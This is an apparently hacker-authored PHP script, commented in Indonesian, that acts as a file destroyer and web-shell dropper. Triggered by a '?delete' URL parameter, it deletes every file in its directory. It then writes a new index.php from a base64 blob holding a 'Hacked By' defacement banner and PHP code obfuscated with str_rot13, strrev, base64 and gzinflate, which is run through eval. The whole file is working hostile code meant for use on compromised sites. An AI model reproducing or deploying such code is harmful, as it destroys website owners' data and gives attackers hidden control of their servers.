<!--//File Destroyer & Re-writer-->  
<!-- Setelah semua terhapus akses index.php?uploader-->
<?php if (isset($_GET["delete"])) { 
	$files = scandir(__DIR__); 
	foreach ($files as $file) { 
		if (is_file($file)) {  
			unlink($file); }} 
			echo "All Files Deleted and Creating New Index";
			echo " Silahkan akses index.php?ndelik";
			$f = fopen("index.php", "w") or die("Unable to open file!"); 
			fwrite($f, base64_decode('SGFja2VkIEJ5IC4vIE1oQG5rayAtIE1lY2hhbmljYWwgV2Fybgo8P3BocAovKgpUb29scyBDb2RlZCBCeSAuL21oQG5rayAgICAgICAgIAoqLwokbWhhbmtrID0gIlYvY252MmQrd3Y2QnlUL004bVQxejFBOFBmTEpvbm1uWVNBd1hRbGR4VjNaeXo3SXZHM2NYMzZJOEN6WnhXbU1kZlB3cFlBWi80b3RkbW83RVFSNE5KWGcrZ0xsdE9acGVlRytwQ3N0T0l5Y2NOeWtTNW5vWUFSSU40aWpINVMwZUZZR0JrSEIzUHB3RzFnYUdxWm54ZTVEMGtHUmZpbTYweTdScXlLdEpMWFVtZUplTS9XVUhzbFduSmVCdUpNOEg0K2dJT01OVi8vWmVrakd2OC9YM2FPZG1UNk1WOEppKzVVQnJ0NDI5M2JjbHI2dVluVVJvVVM4SDdaMXRBMTRuR3kzOUtpN3R2OFh2cy80UlFXTGlleVlQcmRGWHpxM1Y4bXl0MnpQdjZ6aG1WKzdiYXAzeDRBUVNMWnN2WU9paDZGWllWKzBoZkI0QUNQVW5OekFWM0RFWC9NN3YxdVo5UElJQlN4NGRBQkV5RVhpTXFvZ1lZNTJvV25KUk5TWTRpSmFtSDV4eElLb2dvTmxvWmUyNnBtQkJvcVQrYUFnY3k5M2FYeFNKNWlSYTJ4cW80WE1tcDJhTVoyNkRvcElSZFE0Q3JSd1RNTmFzMkN3NEUzQzFqbFVJZDBqRlNyRHBWaWl0bUZSbGtPdEp0NzU4bHZaNi9CV1drVnBUL2UvSTBWZWtRbXNpOGNMeUNoUWUwTnhVS2J3Yk9IYm1ndDM5dnFDUU4yQnI0UEZ3czlhYkpWbGNpbi9hRlFwQndKZSsvVUF3R2cvS0ZRdEI0ZlJCb2JBIjsKJEpvZ2phID0gIj09Tk4xUmJEZXFKTXpHdk14d25uSkpuU0hwV1NkRTZjYW9QY2FGcHpucmRTeUhGTXZFZHl4SHJjekcyNVQ1RllYdUZZQzc4RkFlbGVWU0FtWTFsRiI7CmV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoc3RycmV2KHN0cl9yb3QxMygkSm9namEpKSkpKTsKZXhpdDsKPz4='));} ?>
<!-- Versi Encode 
gzinflate/base64_decode/strrev/str_rot13 -->
